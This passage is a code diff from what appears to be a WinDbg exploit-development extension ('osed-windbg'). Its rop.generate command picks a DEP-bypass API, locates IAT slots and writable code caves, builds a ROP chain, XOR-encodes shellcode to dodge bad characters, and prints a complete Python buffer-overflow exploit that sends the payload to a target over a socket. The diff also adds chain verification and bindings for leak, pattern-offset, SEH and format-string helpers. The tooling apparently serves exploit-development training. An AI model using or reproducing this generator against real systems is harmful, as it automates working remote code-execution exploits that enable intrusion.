+        info(`# Resolves ${selected.candidate.target.module}!${selected.candidate.target.symbol} into EAX; it does not construct or invoke the API call frame.`);
+        info(`# Expected EAX: ${plan.expectedOutput !== void 0 ? hex32(plan.expectedOutput) : "unknown"}`);
+        if (plan.clobbers.length > 0)
+          info(`# Clobbers: ${plan.clobbers.join(", ")}`);
+        for (const line of formatChainPython({ steps: plan.steps }))
+          print(line);
+      }
+      renderRows("ROP API Resolution Builder", rows);
+      setResult({
+        command: "rop.api_build",
+        args: { target, output, preserve, maxGadgets, badchars, continuation, owner: requestedOwner || void 0, anchor: requestedAnchor || void 0 },
+        success: plan.state === "CHAIN_CONSTRUCTED",
+        findings: [{ snapshot, candidate: selected.candidate, plan, attempts: selected.attempts }],
+        warnings: [...plan.unsatisfied, ...rejected.flatMap((attempt) => attempt.rejectionReasons)],
+        errors: []
+      });
+      return toDxResult("ROP API Resolution Builder", rows);
+    };
+    const API_IAT_NAMES = {
+      VirtualProtect: "VirtualProtect",
+      VirtualAlloc: "VirtualAlloc",
+      WriteProcessMemory: "WriteProcessMemory",
+      VirtualProtectEx: "VirtualProtectEx",
+      VirtualAllocEx: "VirtualAllocEx",
+      WinExec: "WinExec"
+    };
+    const executeRopGenerate = (...args) => {
+      var _a, _b, _c, _d, _e, _f, _g, _h, _i, _j, _k, _l;
+      if (args.length === 1 && args[0] === "help") {
+        return helperHelp("rop.generate");
+      }
+      if (!currentRopCorpus) {
+        const rows2 = [{ Error: NO_ROP_CORPUS_MESSAGE }];
+        renderRows("Exploit Builder", rows2);
+        return toDxResult("Exploit Builder", rows2);
+      }
+      const exploitStale = staleCorpusGuard("Exploit Builder", "rop.generate");
+      if (exploitStale)
+        return exploitStale;
+      const options = isPlainObject(args[0]) ? args[0] : { api: args[0], shellcode: args[1], badchars: args[2], module: args[3], offset: args[4] };
+      const SUPPORTED_APIS = ["VirtualProtect", "VirtualAlloc", "WriteProcessMemory", "WinExec", "VirtualProtectEx", "VirtualAllocEx"];
+      const DEP_BYPASS_APIS = ["VirtualProtect", "VirtualAlloc", "WriteProcessMemory", "VirtualProtectEx", "VirtualAllocEx"];
+      const discoverIatSlot = (apiName) => {
+        var _a2;
+        const iatName = API_IAT_NAMES[apiName];
+        if (!iatName)
+          return void 0;
+        try {
+          const scNs = api.sc;
+          if (scNs && typeof scNs.iat_find === "function") {
+            const dxResult = scNs.iat_find(iatName);
+            if ((dxResult == null ? void 0 : dxResult.rows) && dxResult.rows.length > 0) {
+              const firstRow = dxResult.rows[0];
+              const slotStr = String((_a2 = firstRow.Slot) != null ? _a2 : "");
+              const match = /0x([0-9a-fA-F]+)/i.exec(slotStr);
+              if (match)
+                return parseInt(match[1], 16) >>> 0;
+            }
+          }
+        } catch (e) {
+        }
+        return void 0;
+      };
+      const isDwordBadcharFree = (value, bad) => {
+        if (bad.length === 0)
+          return true;
+        const badSet = new Set(bad.map((b) => b & 255));
+        const v = value >>> 0;
+        for (let i = 0; i < 4; i++)
+          if (badSet.has(v >>> i * 8 & 255))
+            return false;
+        return true;
+      };
+      const badchars = parseBadcharsOption(options.badchars);
+      const isAutoApi = String((_a = options.api) != null ? _a : "").toLowerCase() === "auto";
+      let strategyName;
+      if (isAutoApi) {
+        section("API Auto-Selection");
+        info("Evaluating DEP bypass candidates...");
+        const candidates2 = [];
+        for (const apiName of DEP_BYPASS_APIS) {
+          const slot = discoverIatSlot(apiName);
+          const argCount = (_b = { VirtualProtect: 4, VirtualAlloc: 4, WriteProcessMemory: 5, VirtualProtectEx: 5, VirtualAllocEx: 5, WinExec: 2 }[apiName]) != null ? _b : 0;
+          const slotClean = slot !== void 0 ? isDwordBadcharFree(slot, badchars) : false;
+          let score = 0;
+          const reasons = [];
+          if (slot !== void 0) {
+            score += 50;
+            reasons.push("IAT slot found");
+            if (slotClean) {
+              score += 20;
+              reasons.push("slot address badchar-free");
+            } else {
+              score -= 10;
+              reasons.push("slot address contains badchar(s)");
+            }
+          } else {
+            reasons.push("IAT slot NOT found");
+          }
+          score += Math.max(0, 10 - argCount * 2);
+          if (argCount <= 4)
+            reasons.push(`${argCount} args (compact frame)`);
+          else
+            reasons.push(`${argCount} args`);
+          if (apiName === "VirtualAlloc") {
+            score += 5;
+            reasons.push("preferred default");
+          }
+          if (apiName.endsWith("Ex")) {
+            score -= 5;
+            reasons.push("Ex variant (less common)");
+          }
+          candidates2.push({ api: apiName, iatSlot: slot, slotClean, argCount, reason: reasons.join("; "), score });
+        }
+        candidates2.sort((a, b) => b.score - a.score);
+        for (const c of candidates2) {
+          const status = c.iatSlot !== void 0 ? `${hex32(c.iatSlot)}${c.slotClean ? "" : " [BADCHAR]"}` : "not found";
+          const marker = c === candidates2[0] ? " \u2190 SELECTED" : "";
+          info(`  ${c.api.padEnd(20)} IAT: ${status.padEnd(24)} Score: ${String(c.score).padStart(3)}  (${c.reason})${marker}`);
+        }
+        const best = candidates2[0];
+        if (best.iatSlot === void 0) {
+          warn("No API found in IAT. The selected candidate will require a manual iatSlot override.");
+        }
+        strategyName = best.api;
+        info(`Selected: ${strategyName} (score ${best.score})`);
+      } else {
+        strategyName = normalizeExploitStrategy(String((_c = options.api) != null ? _c : "VirtualAlloc"));
+        if (!strategyName || strategyName === "Stack Pivot" || strategyName === "LoadLibraryA" || strategyName === "GetProcAddress") {
+          const rows2 = [{
+            Error: "rop.generate supports VirtualProtect, VirtualAlloc, WriteProcessMemory, WinExec, Ex variants, or 'auto'. Got: " + String((_d = options.api) != null ? _d : "(none)")
+          }];
+          renderRows("Exploit Builder", rows2);
+          return toDxResult("Exploit Builder", rows2);
+        }
+      }
+      const shellcodeHex = String((_e = options.shellcode) != null ? _e : "");
+      const entrySkew = Number((_f = options.entrySkew) != null ? _f : 0);
+      const pythonLines = [];
+      const allWarnings = [];
+      const allErrors = [];
+      section(`Exploit Builder \u2014 ${strategyName}`);
+      let iatSlotAddr;
+      if (options.iatSlot !== void 0) {
+        iatSlotAddr = Number(options.iatSlot) >>> 0;
+        info(`IAT slot: ${hex32(iatSlotAddr)} (user-supplied)`);
+      } else {
+        iatSlotAddr = discoverIatSlot(strategyName);
+        if (iatSlotAddr !== void 0) {
+          info(`IAT slot: ${hex32(iatSlotAddr)} (auto-discovered for ${strategyName})`);
+        } else {
+          allWarnings.push(`Could not auto-discover IAT slot for ${strategyName}. Pass iatSlot manually, or run: dx @$osed().sc.iat_find("${strategyName}")`);
+          warn(`IAT slot not found \u2014 use iatSlot parameter or run sc.iat_find("${strategyName}")`);
+        }
+      }
+      let bufAddr;
+      if (options.buf !== void 0) {
+        bufAddr = typeof options.buf === "number" ? `0x${(options.buf >>> 0).toString(16).padStart(8, "0")}` : String(options.buf).trim();
+        info(`Buffer: ${bufAddr} (user-supplied)`);
+      } else {
+        try {
+          const cavesResult = registry.execute("code_caves", {
+            module: options.module,
+            minSize: 512,
+            maxResults: 5
+          });
+          if (cavesResult.success && cavesResult.findings.length > 0) {
+            const cave = cavesResult.findings.find((c) => c.writable === true);
+            if (cave) {
+              const caveAddr = String((_g = cave.address) != null ? _g : "");
+              const addrMatch = /0x([0-9a-fA-F]+)/i.exec(caveAddr);
+              if (addrMatch) {
+                bufAddr = `0x${addrMatch[1]}`;
+                const caveSize = (_h = cave.size) != null ? _h : "?";
+                info(`Buffer: ${bufAddr} (code cave, ${caveSize} bytes, module: ${(_i = cave.module) != null ? _i : "?"})`);
+              }
+            } else {
+              allWarnings.push("Code caves found but none confirmed writable. Pass buf address, or verify with !vprot.");
+              warn("Code caves found but none writable \u2014 use buf parameter or verify with !vprot");
+            }
+          }
+        } catch (e) {
+        }
+        if (!bufAddr) {
+          allWarnings.push("Could not auto-discover writable buffer. Pass buf address, or run: dx @$osed().code_caves(module)");
+          warn("Writable buffer not found \u2014 use buf parameter or run code_caves()");
+          bufAddr = "BUF";
+        }
+      }
+      let retGadgetAddr;
+      let retGadgetSeq = "";
+      const jmpEspCandidates = currentRopCorpus.query({
+        capability: "DISPATCH_JMP_REGISTER",
+        executableOnly: true
+      });
+      const jmpEsp = jmpEspCandidates.find((g) => {
+        const cap = g.capabilities.find((c) => c.kind === "DISPATCH_JMP_REGISTER");
+        return cap && cap.register === "esp";
+      });
+      if (jmpEsp) {
+        retGadgetAddr = firstKnownAddress(jmpEsp);
+        retGadgetSeq = jmpEsp.instructions.map((i) => i.normalizedText || i.originalText).join(" ; ");
+      }
+      let retAddrWord;
+      if (options.retAddr !== void 0) {
+        const ra = typeof options.retAddr === "number" ? `0x${(options.retAddr >>> 0).toString(16)}` : String(options.retAddr).trim();
+        if (/^(0x)?[0-9a-fA-F]+$/.test(ra)) {
+          retAddrWord = { value: parseInt(ra.replace(/^0x/i, ""), 16) >>> 0, comment: "return address (user-supplied)" };
+        } else {
+          retAddrWord = { placeholder: ra.toUpperCase(), comment: "return address (user-supplied placeholder)" };
+        }
+      } else if (retGadgetAddr !== void 0) {
+        retAddrWord = { value: Number(retGadgetAddr), comment: `return via: ${retGadgetSeq}` };
+        info(`Return gadget: ${hex32(retGadgetAddr)} \u2014 ${retGadgetSeq}`);
+      } else {
+        retAddrWord = { placeholder: "RETADDR", comment: "return address \u2014 find jmp esp or similar" };
+        allWarnings.push("No jmp esp gadget found for post-call return. Supply retAddr or find one with: rop.query({capability: 'DISPATCH_JMP_REGISTER'})");
+        warn("No jmp esp found \u2014 supply retAddr or query the corpus");
+      }
+      let writableWord;
+      if (options.writable !== void 0) {
+        writableWord = { value: Number(options.writable) >>> 0, comment: "writable dword (out-param sink)" };
+      } else {
+        const bufParsed = /^0x([0-9a-fA-F]+)$/i.exec(bufAddr);
+        if (bufParsed) {
+          writableWord = { value: parseInt(bufParsed[1], 16) + 256 >>> 0, comment: "writable dword (BUF+0x100, out-param sink)" };
+        } else {
+          writableWord = { placeholder: "WRITABLE", comment: "any writable dword for out-param" };
+        }
+      }
+      const frame = buildExploitFrame(strategyName, retAddrWord, writableWord);
+      const frameSpec = frame.map((w) => {
+        if (w.derefSlot !== void 0)
+          return `[${hex32(w.derefSlot)}]`;
+        if (w.placeholder)
+          return w.placeholder;
+        return hex32(w.value);
+      }).join(" ");
+      let chainPlan;
+      if (iatSlotAddr !== void 0) {
+        chainPlan = planSlotDispatch(currentRopCorpus, /^0x[0-9a-fA-F]+$/i.test(bufAddr) ? { value: parseInt(bufAddr.replace(/^0x/i, ""), 16) >>> 0 } : { placeholder: bufAddr.toUpperCase() }, iatSlotAddr, frame, badchars, buildStableAddressPredicate(), entrySkew);
+        if (chainPlan.success) {
+          info(`Chain: ${chainPlan.steps.length} steps, ${chainPlan.stackBytes} bytes`);
+          if (chainPlan.placeholders.length > 0) {
+            info(`Placeholders to resolve: ${chainPlan.placeholders.join(", ")}`);
+          }
+        } else {
+          for (const u of chainPlan.unsatisfied) {
+            allWarnings.push(u);
+            warn(u);
+          }
+        }
+      }
+      let encodeResult;
+      if (shellcodeHex.trim().length > 0) {
+        try {
+          const encResult = registry.execute("encode", {
+            shellcode: shellcodeHex,
+            exclude: badchars.length > 0 ? badchars : [0, 10, 13]
+          });
+          if (encResult.success && encResult.findings.length > 0) {
+            encodeResult = encResult.findings[0];
+            info(`Shellcode: ${encodeResult.totalSize} bytes (key: ${encodeResult.keyHex}, stub: ${encodeResult.stubSize} bytes)`);
+          } else {
+            for (const e of encResult.errors)
+              allErrors.push(e);
+            for (const w of encResult.warnings)
+              allWarnings.push(w);
+          }
+        } catch (err) {
+          allWarnings.push(`Shellcode encoding failed: ${err instanceof Error ? err.message : String(err)}`);
+        }
+      }
+      section("Python Exploit");
+      pythonLines.push("#!/usr/bin/env python3");
+      pythonLines.push(`# ${strategyName} DEP bypass exploit \u2014 generated by osed-windbg rop.generate()`);
+      pythonLines.push("import socket");
+      pythonLines.push("from struct import pack");
+      pythonLines.push("");
+      pythonLines.push("# ---- Configuration ----");
+      pythonLines.push(`target_host = "192.168.1.100"  # TODO: set target`);
+      pythonLines.push(`target_port = 9999             # TODO: set port`);
+      pythonLines.push(`total_length = 5000             # TODO: set buffer size`);
+      if (options.offset !== void 0) {
+        pythonLines.push(`offset = ${Number(options.offset)}                  # EIP offset from triage/pattern_offset`);
+      } else {
+        pythonLines.push(`offset = 0                     # TODO: set EIP offset from triage/pattern_offset`);
+      }
+      pythonLines.push("");
+      if (chainPlan == null ? void 0 : chainPlan.success) {
+        pythonLines.push("# ---- ROP Chain ----");
+        pythonLines.push('rop = b""');
+        for (const step of chainPlan.steps) {
+          const word = step.kind === "gadget" ? hex32(step.address) : (_j = step.placeholder) != null ? _j : hex32(step.value);
+          pythonLines.push(`rop += pack("<I", ${word})  # ${step.comment}`);
+        }
+        pythonLines.push("");
+      } else {
+        pythonLines.push("# ---- ROP Chain (could not auto-build \u2014 see warnings) ----");
+        pythonLines.push('rop = b""');
+        pythonLines.push(`# TODO: Build chain manually with rop.slot_call("${bufAddr}", "${iatSlotAddr !== void 0 ? hex32(iatSlotAddr) : "IAT_SLOT"}", "${frameSpec}", "${badchars.map((b) => b.toString(16).padStart(2, "0")).join(" ")}")`);
+        pythonLines.push("");
+      }
+      if (encodeResult) {
+        const combined = encodeResult.combined;
+        const pyBytes = combined.map((b) => `\\x${(b & 255).toString(16).padStart(2, "0")}`).join("");
+        pythonLines.push("# ---- Encoded Shellcode ----");
+        pythonLines.push(`# XOR key: ${encodeResult.keyHex}, stub: ${encodeResult.stubSize} bytes, payload: ${encodeResult.encodedSize} bytes`);
+        const CHUNK = 60;
+        const fullStr = `b"${pyBytes}"`;
+        if (fullStr.length <= 100) {
+          pythonLines.push(`shellcode = ${fullStr}`);
+        } else {
+          pythonLines.push('shellcode = b""');
+          for (let i = 0; i < combined.length; i += CHUNK) {
+            const chunk = combined.slice(i, i + CHUNK);
+            const chunkStr = chunk.map((b) => `\\x${(b & 255).toString(16).padStart(2, "0")}`).join("");
+            pythonLines.push(`shellcode += b"${chunkStr}"`);
+          }
+        }
+        pythonLines.push("");
+      } else if (shellcodeHex.trim().length > 0) {
+        pythonLines.push("# ---- Shellcode (encoding failed \u2014 see warnings) ----");
+        pythonLines.push(`shellcode = b""  # TODO: encode manually with encode("${shellcodeHex.slice(0, 20)}...", badchars)`);
+        pythonLines.push("");
+      } else {
+        pythonLines.push("# ---- Shellcode ----");
+        pythonLines.push('shellcode = b""  # TODO: paste msfvenom output or use encode()');
+        pythonLines.push("");
+      }
+      pythonLines.push("# ---- NOP sled (optional) ----");
+      pythonLines.push('nops = b"\\x90" * 16');
+      pythonLines.push("");
+      pythonLines.push("# ---- Assemble payload ----");
+      pythonLines.push('padding = b"A" * offset');
+      pythonLines.push("# The EIP overwrite: first gadget of the ROP chain");
+      if ((chainPlan == null ? void 0 : chainPlan.success) && chainPlan.steps.length > 0) {
+        const eipStep = chainPlan.steps[0];
+        const eipWord = eipStep.kind === "gadget" ? hex32(eipStep.address) : (_k = eipStep.placeholder) != null ? _k : hex32(eipStep.value);
+        pythonLines.push(`eip = pack("<I", ${eipWord})  # ${eipStep.comment}`);
+        pythonLines.push("# rop[4:] is the rest of the chain (eip already consumed the first dword)");
+        pythonLines.push("chain_body = rop[4:]");
+      } else {
+        pythonLines.push('eip = pack("<I", 0x41414141)  # TODO: first gadget address');
+        pythonLines.push("chain_body = rop");
+      }
+      pythonLines.push("");
+      pythonLines.push("payload = padding + eip + chain_body + nops + shellcode");
+      pythonLines.push('payload += b"C" * (total_length - len(payload))');
+      pythonLines.push("");
+      pythonLines.push("# ---- Send ----");
+      pythonLines.push("s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)");
+      pythonLines.push("s.connect((target_host, target_port))");
+      pythonLines.push("# s.recv(1024)  # banner");
+      pythonLines.push("s.send(payload)");
+      pythonLines.push("s.close()");
+      pythonLines.push(`print(f"[*] Sent {len(payload)} bytes to {target_host}:{target_port}")`);
+      for (const line of pythonLines) {
+        print(line);
+      }
+      for (const w of allWarnings)
+        warn(w);
+      for (const e of allErrors)
+        error(e);
+      const rows = [
+        {
+          API: strategyName,
+          "IAT Slot": iatSlotAddr !== void 0 ? hex32(iatSlotAddr) : "not found",
+          Buffer: bufAddr,
+          Chain: (chainPlan == null ? void 0 : chainPlan.success) ? `${chainPlan.steps.length} steps` : "incomplete",
+          Shellcode: encodeResult ? `${encodeResult.totalSize} bytes` : "none",
+          Return: retGadgetAddr !== void 0 ? hex32(retGadgetAddr) : "placeholder"
+        }
+      ];
+      renderRows("Exploit Builder", rows);
+      setResult({
+        command: "rop.generate",
+        args: __spreadProps(__spreadValues({}, options), { resolvedApi: strategyName }),
+        success: ((_l = chainPlan == null ? void 0 : chainPlan.success) != null ? _l : false) && allErrors.length === 0,
+        findings: [{ python: pythonLines, chain: chainPlan, encode: encodeResult }],
+        warnings: allWarnings,
+        errors: allErrors
+      });
+      if ((chainPlan == null ? void 0 : chainPlan.success) && chainPlan.steps.length > 0) {
+        lastGeneratedProofInput = { chain: chainPlan.steps, corpus: currentRopCorpus, api: strategyName };
+      }
+      return toDxResult("Exploit Builder", rows);
+    };
+    const executeRopProve = (...args) => {
+      var _a;
+      if (args.length === 1 && args[0] === "help")
+        return helperHelp("rop.prove");
+      const controller = new ProofController({
+        adapter: new WinDbgProofAdapter(),
+        store: proofSessionStore,
+        getDefaultInput: () => lastGeneratedProofInput,
+        getCorpus: () => currentRopCorpus,
+        writeText: writeProofText
+      });
+      const options = args.length === 0 ? void 0 : isPlainObject(args[0]) ? args[0] : typeof args[0] === "string" ? { [/^(status|cancel|history|export)$/i.test(args[0]) ? "action" : "mode"]: args[0], orphans: args[1], path: args[2] } : {};
+      const outcome = controller.execute(options);
+      const rows = [];
+      if (outcome.error) {
+        rows.push({ Error: outcome.error });
+      } else if (outcome.history) {
+        for (const session of outcome.history) {
+          rows.push({
+            Session: session.id,
+            State: session.state,
+            Execution: session.executionStatus,
+            Objective: session.objectiveStatus,
+            Checkpoint: `${session.checkpointIndex}/${session.plan.checkpoints.length}`
+          });
+        }
+        if (rows.length === 0)
+          rows.push({ Session: "none", State: "IDLE", Execution: "UNVERIFIED", Objective: "UNVERIFIED", Checkpoint: "0/0" });
+      } else if (outcome.session) {
+        const session = outcome.session;
+        rows.push({
+          Session: session.id,
+          State: session.state,
+          Execution: session.executionStatus,
+          Objective: session.objectiveStatus,
+          Checkpoint: `${session.checkpointIndex}/${session.plan.checkpoints.length}`,
+          Next: session.ownedBreakpoint ? `0x${session.ownedBreakpoint.address.toString(16).toUpperCase().padStart(8, "0")}` : "none",
+          Reason: session.objectiveReason
+        });
+      } else if (outcome.orphanResults) {
+        for (const result3 of outcome.orphanResults)
+          rows.push({ Session: "orphan", State: result3.status, Execution: "UNVERIFIED", Objective: "UNVERIFIED", Checkpoint: "n/a" });
+      }
+      renderRows("ROP Proof", rows);
+      const errors = outcome.error ? [outcome.error] : [];
+      setResult({
+        command: "rop.prove",
+        args: options != null ? options : {},
+        success: outcome.success,
+        findings: [outcome],
+        warnings: ((_a = outcome.session) == null ? void 0 : _a.executionStatus) === "UNVERIFIED" ? ["Execution remains UNVERIFIED."] : [],
+        errors
+      });
+      return toDxResult("ROP Proof", rows);
+    };
+    const executeRopVerify = (...args) => {
+      var _a, _b, _c, _d, _e, _f;
+      if (args.length === 1 && args[0] === "help") {
+        return helperHelp("rop.verify");
+      }
+      const options = isPlainObject(args[0]) ? args[0] : { chain: typeof args[0] === "string" ? args[0] : void 0, badchars: args[1], api: args[2] };
+      const badchars = parseBadcharsOption((_b = options.badchars) != null ? _b : (_a = lastResult == null ? void 0 : lastResult.args) == null ? void 0 : _a.badchars);
+      let steps;
+      let sourceLabel;
+      if (typeof options.chain === "string" && options.chain.trim().length > 0) {
+        steps = parseManualChain(options.chain);
+        sourceLabel = `manual chain (${steps.length} DWORDs)`;
+      } else if ((lastResult == null ? void 0 : lastResult.command) === "rop.generate" && lastResult.success && lastResult.findings.length > 0) {
+        const genResult = lastResult.findings[0];
+        const chainPlan = genResult.chain;
+        if ((chainPlan == null ? void 0 : chainPlan.steps) && chainPlan.steps.length > 0) {
+          steps = chainPlan.steps;
+          sourceLabel = `last rop.generate result (${steps.length} DWORDs)`;
+        } else {
+          const rows2 = [{ Error: "Last rop.generate did not produce a complete chain. Supply a manual chain or re-run rop.generate." }];
+          renderRows("Chain Verifier", rows2);
+          return toDxResult("Chain Verifier", rows2);
+        }
+      } else {
+        const rows2 = [{ Error: 'No chain to verify. Run rop.generate first, or pass {chain: "ADDR1 ADDR2 ..."}' }];
+        renderRows("Chain Verifier", rows2);
+        return toDxResult("Chain Verifier", rows2);
+      }
+      const api_name = options.api ? String(options.api) : (lastResult == null ? void 0 : lastResult.command) === "rop.generate" ? String((_d = (_c = lastResult.args) == null ? void 0 : _c.resolvedApi) != null ? _d : "") || void 0 : void 0;
+      const report = verifyChain({
+        steps,
+        badchars,
+        api: api_name,
+        corpus: currentRopCorpus != null ? currentRopCorpus : void 0,
+        expectedArgCount: options.expectedArgCount ? Number(options.expectedArgCount) : void 0
+      });
+      section(`Chain Verifier \u2014 ${sourceLabel}`);
+      section("Static Analysis");
+      info(`DWORDs: ${report.static.dwordCount}  |  Stack: ${report.static.totalStackBytes} bytes  |  Alignment: ${report.static.alignment}`);
+      if (report.static.badcharHits.length > 0) {
+        error(`Bad character violations: ${report.static.badcharHits.length}`);
+        for (const hit of report.static.badcharHits) {
+          error(`  [${hit.stepIndex}] ${hit.dwordHex} \u2014 byte ${hit.bytePosition} = 0x${hit.byte.toString(16).padStart(2, "0")} @ offset ${hit.byteOffset} \u2014 ${hit.comment}`);
+        }
+      } else if (badchars.length > 0) {
+        info("Bad characters: CLEAN \u2014 no violations found");
+      }
+      if (report.static.unresolvedPlaceholders.length > 0) {
+        warn(`Unresolved placeholders: ${report.static.unresolvedPlaceholders.length}`);
+        for (const p of report.static.unresolvedPlaceholders) {
+          warn(`  [${p.stepIndex}] ${p.placeholder} @ offset ${p.byteOffset} \u2014 ${p.comment}`);
+        }
+      }
+      if (report.static.frameCheck) {
+        const fc = report.static.frameCheck;
+        if (fc.status === "ok") {
+          info(`Frame check: ${fc.detail}`);
+        } else if (fc.status === "not_checked") {
+          warn(`Frame check: ${fc.detail}`);
+        } else if (fc.status === "unknown_api") {
+          warn(`Frame check: ${fc.detail}`);
+        } else {
+          error(`Frame check FAILED: ${fc.detail}`);
+        }
+      }
+      for (const a of report.static.assumptions) {
+        info(`  Assumption: ${a}`);
+      }
+      section("Runtime Trace");
+      if (!report.runtime.available) {
+        warn((_e = report.runtime.reason) != null ? _e : "Runtime trace unavailable");
+      } else {
+        info("ESP+Off  | DWORD      | Action                                           | Side Effects");
+        info("---------|------------|--------------------------------------------------|---------------------------");
+        for (const t of report.runtime.trace) {
+          const espCol = `ESP+${t.espOffset.toString(16).padStart(4, "0").toUpperCase()}`;
+          const effects = t.sideEffects.length > 0 ? t.sideEffects.join("; ") : "";
+          info(`${espCol.padEnd(9)}| ${t.dwordHex.padEnd(11)}| ${t.action.substring(0, 49).padEnd(49)}| ${effects}`);
+          for (const note of t.notes) {
+            info(`         |            |   ${note}`);
+          }
+        }
+        section("Final Register State");
+        const regs = report.runtime.finalRegisters;
+        const regOrder = ["eax", "ebx", "ecx", "edx", "esi", "edi", "ebp", "esp"];
+        for (const reg of regOrder) {
+          if (regs[reg] !== void 0 && regs[reg] !== "?") {
+            info(`  ${reg.toUpperCase()} = ${regs[reg]}`);
+          }
+        }
+        if (report.runtime.registerClobbers.length > 0) {
+          section("Register Clobber Warnings");
+          for (const c of report.runtime.registerClobbers) {
+            warn(`  ${c}`);
+          }
+        }
+        for (const a of report.runtime.assumptions) {
+          info(`  Assumption: ${a}`);
+        }
+      }
+      const hasNotChecked = ((_f = report.static.frameCheck) == null ? void 0 : _f.status) === "not_checked";
+      const staticStatus = !report.static.valid ? "FAIL" : hasNotChecked ? "INCOMPLETE" : "PASS";
+      const runtimeStatus = report.runtime.available ? report.runtime.registerClobbers.length > 0 ? "WARN" : "OK" : "N/A";
+      const rows = [{
+        Source: sourceLabel,
+        DWORDs: String(report.static.dwordCount),
+        Stack: `${report.static.totalStackBytes} bytes`,
+        Badchars: report.static.badcharHits.length > 0 ? `${report.static.badcharHits.length} VIOLATION(S)` : badchars.length > 0 ? "clean" : "not checked",
+        Placeholders: String(report.static.unresolvedPlaceholders.length),
+        Static: staticStatus,
+        Runtime: runtimeStatus
+      }];
+      renderRows("Chain Verifier", rows);
+      setResult({
+        command: "rop.verify",
+        args: options,
+        success: report.static.valid && !hasNotChecked,
+        findings: [report],
+        warnings: report.static.badcharHits.map((h) => `Badchar 0x${h.byte.toString(16).padStart(2, "0")} in ${h.dwordHex} at step ${h.stepIndex}`),
+        errors: []
+      });
+      return toDxResult("Chain Verifier", rows);
+    };
+    for (const command2 of registry.getAll()) {
+      api[command2.name] = (...args) => {
+        return invoke(command2.name, args);
+      };
+    }
+    api.rop = {
+      find: (...args) => {
+        if (args.length === 1 && args[0] === "help") {
+          return helperHelp("rop.find");
+        }
+        return invoke("rop", args);
+      },
+      scan: executeRopScan,
+      scan_live: executeRopScanLive,
+      corpus: {
+        export: executeCorpusExport,
+        report: executeCorpusReport,
+        import: executeCorpusImport,
+        validate: executeCorpusValidate,
+        lookup: executeCorpusLookup
+      },
+      query: executeRopQuery,
+      capabilities: executeRopCapabilities,
+      plan: executeRopPlan,
+      emit: executeRopEmit,
+      synthesize: executeRopSynthesize,
+      export: executeRopExport,
+      pivots: executeRopPivots,
+      chain: executeRopChain,
+      construct: executeRopConstruct,
+      setup: executeRopSetup,
+      chain_vp: executeRopChainVp,
+      chain_wpm: executeRopChainWpm,
+      chain_va: executeRopChainVa,
+      frame_vp: executeRopFrameVp,
+      frame_wpm: executeRopFrameWpm,
+      frame_va: executeRopFrameVa,
+      frame_write: executeRopFrameWrite,
+      slot_call: executeRopSlotCall,
+      api_plan: executeRopApiPlan,
+      api_build: executeRopApiBuild,
+      generate: executeRopGenerate,
+      verify: executeRopVerify,
+      prove: executeRopProve
+    };
+    api.leak = {
+      classify: (...args) => {
+        if (args.length === 1 && args[0] === "help")
+          return helperHelp("leak.classify");
+        return invoke("leak_classify", args);
+      },
+      scan: (...args) => {
+        if (args.length === 1 && args[0] === "help")
+          return helperHelp("leak.scan");
+        return invoke("leak_scan", args);
+      },
+      analyze: (...args) => {
+        if (args.length === 1 && args[0] === "help")
+          return helperHelp("leak.analyze");
+        return invoke("leak_analyze", args);
+      },
+      base: (...args) => {
+        if (args.length === 1 && args[0] === "help")
+          return helperHelp("leak.base");
+        return invoke("leak_base", args);
+      }
+    };
+    api.rop_find = (...args) => invoke("rop", args);
+    api.exploit = {
+      state: executeExploitState,
+      clear: executeExploitClear
+    };
+    api.pattern = {
+      create: (...args) => invoke("pattern_create", args),
+      offset: (...args) => invoke("pattern_offset", args)
+    };
+    api.seh = {
+      visualize: (...args) => invoke("seh", args)
+    };
+    api.fmt = {
+      build: (...args) => invoke("fmt_build", args),
+      offset: (...args) => invoke("fmt_offset", args),
+      inspect: (...args) => {
+        if (args.length === 1 && args[0] === "help")
+          return helperHelp("fmt.inspect");
+        return invoke("fmt_inspect", args);
+      }
+    };
+    api.str = {
+      read: (...args) => {
+        invoke("str_read", args.length === 0 ? args : [commandAddress(args[0]), ...args.slice(1)]);
+        return lastResult == null ? void 0 : lastResult.findings[0];
+      },
+      find: (...args) => {
+        invoke("str_find", args);
+        return lastResult == null ? void 0 : lastResult.findings;
+      },
+      refs: (...args) => {
+        const target = typeof args[0] === "string" && /^(0x)?[0-9a-f`]+$/i.test(args[0].trim()) ? commandAddress(args[0]) : args[0];
+        invoke("str_refs", args.length === 0 ? args : [target, ...args.slice(1)]);
+        return lastResult == null ? void 0 : lastResult.findings;
+      },
+      bytes: (...args) => {
+        invoke("str_bytes", args);
+        return lastResult == null ? void 0 : lastResult.findings[0];
+      }
+    };
+    api.last_result = () => lastResult;
+    api.version = (...args) => {
+      if (args.length === 1 && args[0] === "help") {
+        return invoke("version", args);
+      }
+      invoke("version", []);
+      return getVersionInfo();
+    };
+    api.last_summary = () => {
+      if (!lastResult) {
+        return {
+          success: false,
+          command: "",
+          warnings: 0,
+          errors: 0,
+          findings: 0
+        };
+      }
+      return {
+        success: lastResult.success,
+        command: lastResult.command,
+        warnings: lastResult.warnings.length,
+        errors: lastResult.errors.length,
+        findings: lastResult.findings.length
+      };
+    };
+    api.clear_last_result = () => {
+      lastResult = void 0;
+      return true;
+    };
+    api.sc = sc;
+    const analysisAddress = (value) => {
+      if (typeof value === "bigint" && value >= __bi(0))
+        return value;
+      if (typeof value === "number" && Number.isInteger(value) && value >= 0)
+        return __bi(value);
+      if (typeof value === "string" && /^(0x)?[0-9a-f`]+$/i.test(value.trim())) {
+        return __bi(`0x${value.trim().replace(/^0x/i, "").replace(/`/g, "")}`);
+      }
+      throw new Error("Address must be a non-negative integer, bigint, or hex string.");
+    };
+    const commandAddress = (value) => {
+      const address = analysisAddress(value);
+      return address <= __bi(Number.MAX_SAFE_INTEGER) ? Number(address) : `0x${address.toString(16)}`;
+    };
+    api.memory = (address) => {
+      invoke("memory", [commandAddress(address)]);
+      return lastResult == null ? void 0 : lastResult.findings[0];
+    };
+    api.can_execute = (address) => {
+      var _a;
+      const evidence = api.memory(address);
+      return (_a = evidence == null ? void 0 : evidence.executable) != null ? _a : null;
+    };
+    api.landing = (address) => {
+      invoke("landing", address === void 0 ? [] : [commandAddress(address)]);
+      const evidence = lastResult == null ? void 0 : lastResult.findings[0];
+      return evidence ? toDxResult("Landing Evidence", landingDxRows(evidence)) : void 0;
+    };
+    api.math = (...args) => {
+      invoke("math", args);
+      return lastResult == null ? void 0 : lastResult.findings[0];
+    };
+    return api;
+  }
+  function parseScanLivePositionalArgs(args) {
+    const result3 = { module: args[0] };
